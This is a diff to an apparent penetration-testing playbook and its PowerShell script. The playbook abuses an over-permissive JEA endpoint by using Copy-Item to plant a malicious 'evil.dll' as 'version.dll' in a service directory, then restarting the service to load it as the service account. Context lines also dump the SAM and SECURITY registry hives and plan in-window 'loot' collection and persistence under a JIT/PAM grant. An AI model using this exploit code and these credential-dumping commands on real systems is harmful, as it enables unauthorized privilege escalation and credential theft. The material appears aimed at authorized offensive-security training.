@@ -287,8 +287,6 @@ If the endpoint only exposes a few commands and one of them is `Copy-Item` with 
 
 JEA is a PowerShell session configuration (`-ConfigurationName`). Default `RestrictedRemoteServer` sessions run in **NoLanguageMode** and do not include `Copy-Item` — if you see it, it was added in the role capability. `whoami.exe` and `.NET` syntax will fail; `Get-Command` is the allow-list — what you can see is what you can use. Virtual accounts, when enabled, belong to the local Administrators group by default.
 
-<!-- VERIFY: m14-jea-file-copy.ps1 probes with Set-Content and delivers via [System.IO.File]::WriteAllBytes inside Invoke-Command. In NoLanguageMode those are not allowed. Prefer Copy-Item from a path the session can already read (a share or home folder), as in PEN-300 §23.2.2. Use -ProbeOnly first, and fall back to manual Copy-Item if the script errors on language mode. -->
-
 - [ ] Discover the endpoint name (PowerShell history is the usual source; `Get-PSSessionConfiguration` if you can)
 - [ ] Compile the DLL with a name and architecture that match the missing dependency (`m14-jea-service-dll.cs`, or an msfvenom DLL as in the course)
 - [ ] Start a listener; confirm WinRM to `TARGET`
@@ -349,11 +347,12 @@ Restart-Service <service-name>
 # or Stop-Service then Start-Service, if only one of the two is visible
 ```
 
-If there is no service-control command, wait for the service or the host to restart (the course waited for a reboot) and keep the listener up. Automate the connect / enumerate / probe / drop / trigger loop with `m14-jea-file-copy.ps1` when language mode allows; otherwise run the `Copy-Item` steps by hand.
+If there is no service-control command, wait for the service or the host to restart (the course waited for a reboot) and keep the listener up. Automate the connect / enumerate / probe / drop / trigger loop with `m14-jea-file-copy.ps1`. It uses local implicit-remoting proxies, so the remote endpoint receives only allow-listed command invocations, not script variables or .NET calls. Stage the probe and DLL beforehand in a target-local path the session can read (for example, the home share via your ordinary SMB access); a local attacker path is not a remote source path.
 
 ```powershell
 .\m14-jea-file-copy.ps1 -Target TARGET -Endpoint <JEA-endpoint> -Domain DOMAIN -User USER `
-    -Pass 'PASS' -LocalPayload .\evil.dll -RemoteDir 'C:\Program Files\<Vendor>' `
+    -Pass 'PASS' -ProbeSource 'C:\shares\home\USER\probe.txt' `
+    -StagedPayload 'C:\shares\home\USER\evil.dll' -RemoteDir 'C:\Program Files\<Vendor>' `
     -RemoteName 'version.dll' -ServiceName '<svc>' [-ForceRestart] [-ProbeOnly]
 ```
 
@@ -640,10 +639,12 @@ Purpose: automate the "JEA over-permissive file copy" exploit - connect to the r
 Scenario: scenario 42 (docs/14-kiosk-jea-jit.md). The role capability is too broad: it allows Copy-Item and -Destination
       is not restricted to safe directories; this script does not rely on executing arbitrary code inside the session.
 Requires: PowerShell 5.1+ on the attacker machine; WinRM 5985/5986 open on the target; a JEA endpoint whose Permission includes this account;
-      the DLL that gets dropped is in m14-jea-service-dll.cs (or the M04 native C template).
+      stage the harmless probe and DLL in target-local paths readable by the JEA session before running.
+      Local logic stays in FullLanguage; Import-PSSession proxies invoke only the exposed remote cmdlets.
 Usage:
   .\m14-jea-file-copy.ps1 -Target TARGET -Endpoint <JEAendpoint name> -Domain DOMAIN -User USER `
-      -Pass 'PASS' -LocalPayload .\evil.dll -RemoteDir 'C:\Program Files\<Vendor>' `
+      -Pass 'PASS' -ProbeSource 'C:\shares\home\USER\probe.txt' `
+      -StagedPayload 'C:\shares\home\USER\evil.dll' -RemoteDir 'C:\Program Files\<Vendor>' `
       -RemoteName 'version.dll' -ServiceName '<svc>' [-ForceRestart] [-ProbeOnly]
   Notes: -ProbeOnly only does two things - "enumerate the commands + write a harmless probe" - and does not drop the real payload; use it to confirm the boundary.
        NTHASH logon is not supported over a direct native WinRM connection; see the -NTHash parameter notes.
@@ -658,8 +659,9 @@ param(
     [Parameter(Mandatory)][string]$User,        # JEA role member account (USER)
     [string]$Pass,                              # cleartext password (PASS); mutually exclusive with -NTHash
     [string]$NTHash,                            # NTHASH: informational only (WinRM does not support direct hash logon)
-    [string]$LocalPayload,                      # local malicious DLL path (PAYLOAD)
-    [string]$RemoteDir,                         # target delivery directory (service exe/plug-in directory)
+    [Parameter(Mandatory)][string]$ProbeSource, # target-local, pre-staged harmless file
+    [string]$StagedPayload,                     # target-local, pre-staged DLL path (not an attacker-local path)
+    [Parameter(Mandatory)][string]$RemoteDir,   # target delivery directory (service exe/plug-in directory)
     [string]$RemoteName,                        # file name after delivery (the dependency name the host is missing)
     [string]$ServiceName,                       # service to restart as the trigger
     [switch]$ForceRestart,                      # call Restart-Service after delivery
@@ -690,8 +692,8 @@ if (-not $Pass) {
     }
     throw "-Pass (clear text password) is missing."
 }
-if (-not $ProbeOnly -and (-not $LocalPayload -or -not $RemoteDir -or -not $RemoteName)) {
-    throw "-LocalPayload, -RemoteDir, -RemoteName must be provided in non-ProbeOnly mode."
+if (-not $ProbeOnly -and (-not $StagedPayload -or -not $RemoteName)) {
+    throw "-StagedPayload and -RemoteName must be provided in non-ProbeOnly mode."
 }
 
 $account = "$Domain\$User"
@@ -712,9 +714,9 @@ catch {
 
 # ---- 2. Enumerate the commands available in the session (what you can see is what can be used) ----
 Write-Step "Enumerate available commands within a session:" 
-$allowed = Invoke-Command -Session $session -ScriptBlock {
-    Get-Command | Select-Object Name, CommandType, Source | Sort-Object Name
-}
+$allowed = Invoke-Command -Session $session -ScriptBlock { Get-Command }
+# Filtering, property access and sorting happen locally, not inside NoLanguage.
+$allowed = $allowed | Select-Object Name, CommandType, Source | Sort-Object Name
 $allowed | Format-Table -AutoSize | Out-String | Write-Host
 $hasCopy   = [bool]($allowed | Where-Object { $_.Name -eq 'Copy-Item' })
 $hasRestart = [bool]($allowed | Where-Object { $_.Name -eq 'Restart-Service' })
@@ -727,15 +729,25 @@ if (-not $hasCopy) {
     exit 1
 }
 
-# ---- 3. The harmless probe is written to the target directory ----
+# Import only role-added commands; remote calls stay command-only in NoLanguage.
+$proxyNames = @('Copy-Item')
+if ($hasRestart) { $proxyNames += 'Restart-Service' }
+if ($hasStop) { $proxyNames += 'Stop-Service' }
+if ($hasStart) { $proxyNames += 'Start-Service' }
+try {
+    $proxyModule = Import-PSSession -Session $session -CommandName $proxyNames -Prefix JEA -ErrorAction Stop
+}
+catch {
+    Remove-PSSession $session
+    throw
+}
+
+# ---- 3. Copy the pre-staged harmless probe to the target directory ----
 $probe = "m14probe_$([guid]::NewGuid().ToString('N').Substring(0,8)).txt"
 Write-Step "Probe the boundary: Copy-Item probe -> $RemoteDir\$probe"
 $probeOk = $false
 try {
-    Invoke-Command -Session $session -ScriptBlock {
-        param($dir, $file)
-        Set-Content -Path (Join-Path $dir $file) -Value "m14 probe" -ErrorAction Stop
-    } -ArgumentList $RemoteDir, $probe
+    Copy-JEAItem -Path $ProbeSource -Destination (Join-Path $RemoteDir $probe) -ErrorAction Stop
     $probeOk = $true
     Write-Step "Probe writing successful: $RemoteDir\$probe (directory is within replication capability)" 'Green'
 }
@@ -746,45 +758,41 @@ catch {
 
 if ($ProbeOnly) {
     Write-Step "ProbeOnly: That’s it. The probe can be cleaned up (if the session allows Remove-Item), otherwise the recorded path will be processed afterwards."
+    Remove-Module $proxyModule -ErrorAction SilentlyContinue
     Remove-PSSession $session
+    if (-not $probeOk) { exit 1 }
     exit 0
 }
 if (-not $probeOk) {
     Write-Host "[!] Boundary detection failed, the payload was not delivered, and exited. Rerunable -ProbeOnly troubleshooting." -ForegroundColor 'Red'
+    Remove-Module $proxyModule -ErrorAction SilentlyContinue
     Remove-PSSession $session
     exit 1
 }
 
 # ---- 4. Deliver malicious DLL ----
-Write-Step "Deliver payload: $LocalPayload -> $RemoteDir\$RemoteName"
-if (-not (Test-Path $LocalPayload)) { throw "Local payload does not exist: $LocalPayload" }
+Write-Step "Deliver payload: $StagedPayload -> $RemoteDir\$RemoteName"
 try {
-    $bytes = [System.IO.File]::ReadAllBytes((Resolve-Path $LocalPayload))
-    Invoke-Command -Session $session -ScriptBlock {
-        param($dir, $name, $data)
-        [System.IO.File]::WriteAllBytes((Join-Path $dir $name), $data)
-    } -ArgumentList $RemoteDir, $RemoteName, $bytes
+    Copy-JEAItem -Path $StagedPayload -Destination (Join-Path $RemoteDir $RemoteName) -ErrorAction Stop
     Write-Step "DLL written: $RemoteDir\$RemoteName (waiting for trigger)" 'Green'
 }
 catch {
     Write-Host "[!] Delivery failed: $($_.Exception.Message)" -ForegroundColor 'Red'
+    Remove-Module $proxyModule -ErrorAction SilentlyContinue
     Remove-PSSession $session
     exit 1
 }
 
 # ---- 5. Trigger loading ----
-if ($ServiceName -and ($ForceRestart -or $hasRestart -or $hasStop)) {
+if ($ServiceName -and $ForceRestart -and ($hasRestart -or ($hasStop -and $hasStart))) {
     Write-Step "Trigger: Restart/start/stop service $ServiceName"
     try {
         if ($hasRestart) {
-            Invoke-Command -Session $session -ScriptBlock {
-                param($svc) Restart-Service -Name $svc -Force -ErrorAction Stop
-            } -ArgumentList $ServiceName
+            Restart-JEAService -Name $ServiceName -ErrorAction Stop
         }
         elseif ($hasStop -and $hasStart) {
-            Invoke-Command -Session $session -ScriptBlock {
-                param($svc) Stop-Service -Name $svc -Force; Start-Service -Name $svc
-            } -ArgumentList $ServiceName
+            Stop-JEAService -Name $ServiceName -ErrorAction Stop
+            Start-JEAService -Name $ServiceName -ErrorAction Stop
         }
         Write-Step "The service has been restarted and the DLL should have been loaded (reconnect window 30–60s)" 'Green'
     }
@@ -798,6 +806,7 @@ else {
 }
 
 Write-Step "Finish. If the DLL is reconnected successfully, please check whoami (should be the service account); remember to restore the overwritten files."
+Remove-Module $proxyModule -ErrorAction SilentlyContinue
 Remove-PSSession $session
 ````
 
@@ -809,7 +818,7 @@ If access is granted only for a short window, don't improvise inside it. Request
 
 PEN-300 §23.3 uses a custom JIT request app on top of the Privileged Access Management (PAM) optional feature. After approval, the current ticket still lacks the new group — `klist purge`, then `Enter-PSSession` (or log out and back in) so the KDC issues a TGT that includes it.
 
-<!-- VERIFY: residual tickets after the window closes are general Kerberos PAC behavior (SID baked in at issue time, TGT lifetime often longer than the group membership). PEN-300 does not teach this, and PAM expiring links / PAC validation may drop the privilege at expiry. Treat leftover access as a bonus to confirm, not a plan — get loot out inside the window. -->
+With PAM TTL memberships (including expiring shadow-principal links), the KDC limits the TGT to the shortest remaining membership TTL; an existing logon token/session may persist, but that does not prove a valid ticket or fresh remote access — get results out inside the approved window.
 
 - [ ] Enumerate whether PAM / a JIT portal is in play (`Get-ADOptionalFeature`, groups, GPOs, browser history)
 - [ ] Pre-plan the in-window command list (results first, persistence last) and start a listener
@@ -866,7 +875,7 @@ reg save HKLM\SAM C:\Users\Public\sam.save /y
 reg save HKLM\SECURITY C:\Users\Public\sec.save /y
 ```
 
-Get results first, talk persistence later. Any ticket, hash, or remote session you obtain is an asset that can outlive the window. The script's `-Mode Run` / `-Mode Wait` will execute `-CommandFile` (one command per line) and then check the residual token.
+Get results first, talk persistence later. Do not assume a ticket or remote session outlives the window: ordinary group removal and PAM TTL expiry are different. The script's `-Mode Run` / `-Mode Wait` will execute `-CommandFile` (one command per line) and then inspect the current process token; that inspection alone cannot validate remote access.
 
 If group membership and the event log are unreadable, camp on the documented activation time and try a new token at high frequency, validating with `whoami /groups`. If the authorized object is not an account you control, take over that account first, then return to this flow. If leftover tickets die the moment the window closes (short TGT, forced logoff, or PAM expiry), concentrate output inside the window.
 
@@ -1064,8 +1073,8 @@ function Start-JitCountdown {
     }
     Write-Log 'Countdown ends: Check the remaining tokens after exiting the window'
     $inToken = Test-TokenHasGroup -GroupName $Group
-    if ($inToken) { Write-Log '[+] The residual token still contains a high-rights group: the ticket life cycle is longer than the group membership and can continue horizontally (do not use it until one second before expiration)' }
-    else { Write-Log '[-] The remaining tokens no longer contain high-power groups: no reusable assets were obtained within the window, and the rescheduling plan was rolled back' 'WARN' }
+    if ($inToken) { Write-Log '[!] The current process token still contains the group SID; this does not prove an unexpired Kerberos ticket or new remote access. PAM TTL can expire tickets at window end.' 'WARN' }
+    else { Write-Log '[-] The current process token does not contain the group; this check says nothing about other sessions or tickets.' 'WARN' }
 }
 
 function Start-JitWait {
